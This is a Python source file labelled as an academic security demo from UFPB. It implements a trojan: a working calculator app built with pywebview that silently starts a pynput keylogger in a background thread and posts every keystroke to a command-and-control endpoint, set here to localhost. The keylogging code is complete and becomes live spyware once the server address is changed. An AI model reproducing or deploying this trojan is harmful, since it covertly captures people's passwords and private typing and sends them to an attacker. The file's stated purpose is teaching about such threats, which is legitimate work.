"""
=============================================================
  DEMO EDUCACIONAL - Seguranca Computacional - UFPB
  Trojan: Calculadora com Keylogger oculto
  APENAS PARA APRESENTACAO ACADEMICA
=============================================================

Este app parece uma calculadora normal, mas roda um keylogger
em background que envia todas as teclas para o servidor C2.
"""

import threading
import uuid
import webview
import requests
from pynput import keyboard

# ---- CONFIGURACAO DO KEYLOGGER (oculta do usuario) ----
C2_SERVER = "http://localhost:8080/api/keystroke"
CLIENT_ID = f"trojan-{uuid.uuid4().hex[:8]}"
# --------------------------------------------------------


# ==================== KEYLOGGER (thread oculta) ====================

def _send_key(key_str):
    try:
        requests.post(
            C2_SERVER,
            json={"key": key_str, "client_id": CLIENT_ID},
            timeout=2,
        )
    except Exception:
        pass


def _on_key_press(key):
    try:
        key_str = key.char if key.char else str(key)
    except AttributeError:
        key_str = str(key)
    threading.Thread(target=_send_key, args=(key_str,), daemon=True).start()


def _start_keylogger():
    """Inicia o keylogger em background - o usuario nao ve nada."""
    listener = keyboard.Listener(on_press=_on_key_press)
    listener.daemon = True
    listener.start()


# ==================== CALCULADORA (o que o usuario ve) ====================

CALCULATOR_HTML = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
        background: #1c1c1e;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        user-select: none;
    }
    .calculator {
        width: 100%;
        max-width: 340px;
        padding: 20px;
    }
    .display {
        background: #1c1c1e;
        color: white;
        text-align: right;
        padding: 10px 15px;
        font-size: 3.2em;
        font-weight: 300;
        min-height: 80px;
        display: flex;
        align-items: flex-end;
        justify-content: flex-end;
        overflow: hidden;
        margin-bottom: 12px;
    }
    .display.small { font-size: 2em; }
    .buttons {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 10px;
    }
    button {
        border: none;
        border-radius: 50%;
        width: 72px;
        height: 72px;
        font-size: 1.6em;
        cursor: pointer;
        transition: filter 0.1s;
        font-family: inherit;
    }
    button:active { filter: brightness(1.4); }
    .num {
        background: #333336;
        color: white;
    }
    .op {
        background: #ff9f0a;
        color: white;
        font-size: 1.8em;
    }
    .op.active {
        background: white;
        color: #ff9f0a;
    }
    .func {
        background: #a5a5a5;
        color: black;
    }
    .zero {
        border-radius: 36px;
        width: 100%;
        grid-column: span 2;
        text-align: left;
        padding-left: 28px;
    }
</style>
</head>
<body>
<div class="calculator">
    <div class="display" id="display">0</div>
    <div class="buttons">
        <button class="func" onclick="clearAll()">AC</button>
        <button class="func" onclick="toggleSign()">+/-</button>
        <button class="func" onclick="percent()">%</button>
        <button class="op" id="op-div" onclick="setOp('/')">&divide;</button>

        <button class="num" onclick="addDigit('7')">7</button>
        <button class="num" onclick="addDigit('8')">8</button>
        <button class="num" onclick="addDigit('9')">9</button>
        <button class="op" id="op-mul" onclick="setOp('*')">&times;</button>

        <button class="num" onclick="addDigit('4')">4</button>
        <button class="num" onclick="addDigit('5')">5</button>
        <button class="num" onclick="addDigit('6')">6</button>
        <button class="op" id="op-sub" onclick="setOp('-')">&minus;</button>

        <button class="num" onclick="addDigit('1')">1</button>
        <button class="num" onclick="addDigit('2')">2</button>
        <button class="num" onclick="addDigit('3')">3</button>
        <button class="op" id="op-add" onclick="setOp('+')">+</button>

        <button class="num zero" onclick="addDigit('0')">0</button>
        <button class="num" onclick="addDecimal()">.</button>
        <button class="op" onclick="calculate()">=</button>
    </div>
</div>

<script>
    let current = "0";
    let previous = null;
    let operator = null;
    let resetNext = false;

    function updateDisplay() {
        const el = document.getElementById("display");
        el.textContent = current;
        el.className = current.length > 9 ? "display small" : "display";
    }

    function addDigit(d) {
        if (resetNext) { current = ""; resetNext = false; }
        if (current === "0" && d !== ".") current = "";
        current += d;
        updateDisplay();
        clearActiveOp();
    }

    function addDecimal() {
        if (resetNext) { current = "0"; resetNext = false; }
        if (!current.includes(".")) current += ".";
        updateDisplay();
    }

    function setOp(op) {
        if (operator && !resetNext) calculate();
        previous = parseFloat(current);
        operator = op;
        resetNext = true;
        clearActiveOp();
        const ids = {"/":"op-div","*":"op-mul","-":"op-sub","+":"op-add"};
        if (ids[op]) document.getElementById(ids[op]).classList.add("active");
    }

    function clearActiveOp() {
        document.querySelectorAll(".op").forEach(b => b.classList.remove("active"));
    }

    function calculate() {
        if (operator === null || previous === null) return;
        const curr = parseFloat(current);
        let result;
        switch(operator) {
            case "+": result = previous + curr; break;
            case "-": result = previous - curr; break;
            case "*": result = previous * curr; break;
            case "/": result = curr !== 0 ? previous / curr : "Erro"; break;
        }
        current = typeof result === "number" ?
            parseFloat(result.toPrecision(10)).toString() : result.toString();
        operator = null;
        previous = null;
        resetNext = true;
        updateDisplay();
        clearActiveOp();
    }

    function clearAll() {
        current = "0";
        previous = null;
        operator = null;
        resetNext = false;
        updateDisplay();
        clearActiveOp();
    }

    function toggleSign() {
        if (current !== "0") {
            current = current.startsWith("-") ? current.slice(1) : "-" + current;
            updateDisplay();
        }
    }

    function percent() {
        current = (parseFloat(current) / 100).toString();
        updateDisplay();
    }
</script>
</body>
</html>
"""


def main():
    # 1. Inicia keylogger em background (invisivel)
    _start_keylogger()

    # 2. Mostra a calculadora (o que o usuario ve)
    webview.create_window(
        "Calculadora",
        html=CALCULATOR_HTML,
        width=360,
        height=560,
        resizable=False,
    )
    webview.start()


if __name__ == "__main__":
    main()
